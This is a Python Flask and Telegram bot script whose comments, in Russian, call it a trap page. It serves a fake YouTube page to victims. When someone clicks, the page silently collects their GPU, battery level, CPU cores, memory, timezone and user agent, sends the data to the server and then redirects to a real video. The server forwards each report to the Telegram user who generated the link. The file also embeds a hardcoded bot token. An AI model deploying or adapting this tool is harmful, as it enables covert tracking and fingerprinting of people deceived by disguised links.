import threading
import requests
import json
import os
import base64
import time
import sqlite3
from flask import Flask, render_template_string, request

# =================================================================
# [1] CONFIG
# =================================================================
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('phantom.db', check_same_thread=False)
    conn.execute('CREATE TABLE IF NOT EXISTS links (sid TEXT PRIMARY KEY, owner_id INTEGER)')
    conn.commit()
    conn.close()

def get_owner(sid):
    try:
        conn = sqlite3.connect('phantom.db', check_same_thread=False)
        res = conn.execute('SELECT owner_id FROM links WHERE sid = ?', (sid,)).fetchone()
        conn.close()
        return res[0] if res else OVERLORD_ID
    except: return OVERLORD_ID

# =================================================================
# [2] ТОТ САМЫЙ РАБОЧИЙ КОРЕНЬ
# =================================================================
@app.route('/')
def index():
    return "ok", 200 # Максимально просто, как было раньше

# =================================================================
# [3] СТРАНИЦА-ЛОВУШКА
# =================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; }
        #app { width:100%; height:100%; display:flex; align-items:center; justify-content:center; 
               background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; cursor:pointer; }
    </style>
</head>
<body onclick="ignite()">
    <div id="app"></div>
<script>
    function ignite() {
        // Собираем батарею быстро (если доступна)
        let bat = "N/A";
        if (navigator.getBattery) {
            navigator.getBattery().then(b => { bat = Math.round(b.level * 100) + "%"; });
        }

        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        
        const info = {
            sid: "{{sid}}",
            bat: bat,
            gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
            ua: navigator.userAgent,
            res: screen.width + "x" + screen.height,
            plat: navigator.platform,
            mem: navigator.deviceMemory || "N/A",
            cores: navigator.hardwareConcurrency || "N/A",
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        // Стреляем данными
        navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(info)));
        
        // Мгновенный уход
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    }
</script>
</body>
</html>
"""

# =================================================================
# [4] ПРИЕМ ДАННЫХ
# =================================================================

@app.route('/v/<sid>')
def serve(sid):
    return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/gate/capture', methods=['POST'])
def capture():
    try:
        raw = base64.b64decode(request.get_data()).decode()
        d = json.loads(raw)
        
        report = (
            f"<b>🔋 ОТЧЕТ СИСТЕМЫ</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>Target ID:</b> <code>{d.get('sid')}</code>\n"
            f"🔋 <b>Заряд:</b> <code>{d.get('bat', 'Pending...')}</code>\n\n"
            f"<b>🎮 GPU:</b> <code>{d.get('gpu')}</code>\n"
            f"<b>🧠 CPU:</b> <code>{d.get('cores')} Cores</code>\n"
            f"<b>💾 RAM:</b> <code>{d.get('mem')} GB</code>\n"
            f"<b>📱 OS:</b> <code>{d.get('plat')}</code>\n"
            f"<b>📐 Res:</b> <code>{d.get('res')}</code>\n"
            f"<b>📍 TZ:</b> <code>{d.get('tz')}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🛰 <b>UA:</b> <code>{d.get('ua')[:100]}...</code>"
        )
        
        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                      json={"chat_id": get_owner(str(d.get('sid'))), "text": report, "parse_mode": "HTML"})
    except: pass
    return "OK"

# =================================================================
# [5] BOT LOOP
# =================================================================

def bot_loop():
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{API_TOKEN}/getUpdates?offset={offset}&timeout=10").json()
            for upd in r.get("result", []):
                offset = upd["update_id"] + 1
                msg = upd.get("message")
                if msg and "text" in msg:
                    cid = msg["chat"]["id"]
                    if msg["text"] == "/start":
                        conn = sqlite3.connect('phantom.db', check_same_thread=False)
                        conn.execute('INSERT OR REPLACE INTO links (sid, owner_id) VALUES (?, ?)', (str(cid), cid))
                        conn.commit()
                        conn.close()
                        link = f"{BASE_URL}/v/{cid}"
                        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                                      json={"chat_id": cid, "text": f"✅ <b>Ссылка готова:</b>\n<code>{link}</code>", "parse_mode": "HTML"})
        except: time.sleep(5)

if __name__ == '__main__':
    init_db()
    threading.Thread(target=bot_loop, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT)
